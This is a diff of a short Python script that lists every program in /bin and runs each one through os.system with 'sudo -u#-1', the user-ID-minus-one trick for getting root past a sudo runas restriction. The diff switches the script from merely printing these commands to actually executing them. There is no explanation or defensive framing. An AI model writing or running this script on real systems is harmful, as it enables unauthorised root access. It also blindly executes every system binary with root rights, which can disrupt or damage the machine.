@@ -1,14 +1,13 @@
 import os
-a_file = open(r"""C:\Users\becker\Documents\naobin.txt""", "r")
+import time
+import subprocess
+out = subprocess.check_output("cd /bin && ls", shell=True).decode("ascii")
 
-a = ""
-for line in a_file:
-  stripped_line = line.replace("\n", ":")
-  a += stripped_line
-a_file.close()
+b = out.replace('\n', ':')
+c = b.split(':')
+print(c)
 
-b = a.split(':')
-
-for x in b:
-    #os.system("sudo -u#-1" + x)
-    print("sudo -u#-1 " + x)
+for x in c:
+    os.system("sudo -u#-1 " + x)
+    #time.sleep(.1)
+    
